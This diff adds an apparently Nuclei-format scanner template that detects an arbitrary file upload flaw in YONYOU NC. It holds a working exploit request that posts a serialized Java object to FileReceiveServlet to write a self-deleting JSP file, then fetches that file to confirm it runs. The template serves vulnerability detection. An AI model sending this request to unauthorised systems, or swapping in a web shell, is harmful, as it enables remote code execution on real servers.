@@ -1,0 +1,40 @@
+id: yonyou-nc-filereceive-servlet-writefile
+info:
+  name: YONYOU NC Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies an arbitrary file upload vulnerability in YONYOU NC > 6.5 by uploading a harmless JSP file and validating its execution.
+  reference:
+    - https://blog.csdn.net/weixin_44578334/article/details/110917053
+
+variables:
+  r1: '{{rand_int(10000, 20000)}}'
+  r2: '{{rand_int(1000000000, 2000000000)}}'
+
+http:
+  - raw:
+      - |
+        POST /servlet/FileReceiveServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+
+        \xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\a\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\b\x00\x00\x00\x10\x00\x00\x00\x02t\x00\tFILE_NAMEt\x00\t{{r1}}.jspt\x00\x10TARGET_FILE_PATHt\x00\x10./webapps/nc_webx<%out.print("{{r2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /{{r1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r2}}"
